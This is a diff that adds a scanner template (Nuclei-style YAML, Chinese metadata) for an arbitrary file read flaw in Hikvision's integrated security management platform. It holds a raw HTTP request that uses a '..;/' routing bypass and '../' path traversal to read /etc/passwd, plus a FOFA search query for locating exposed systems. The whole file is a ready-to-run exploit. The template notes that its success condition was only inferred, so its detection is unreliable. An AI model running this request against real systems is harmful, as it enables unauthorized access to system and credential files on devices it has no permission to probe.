@@ -1,0 +1,25 @@
+id: poc-kqwobseocqkw7e95
+info:
+  name: 海康威视综合安防download存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kqwobseocqkw7e95
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: kqwobseocqkw7e95
+    fofa: title="综合安防管理平台"
+http:
+- raw:
+  - 'GET /center/api/task/..;/orgManage/v1/orgs/download?fileName=../../../../../../../etc/passwd HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
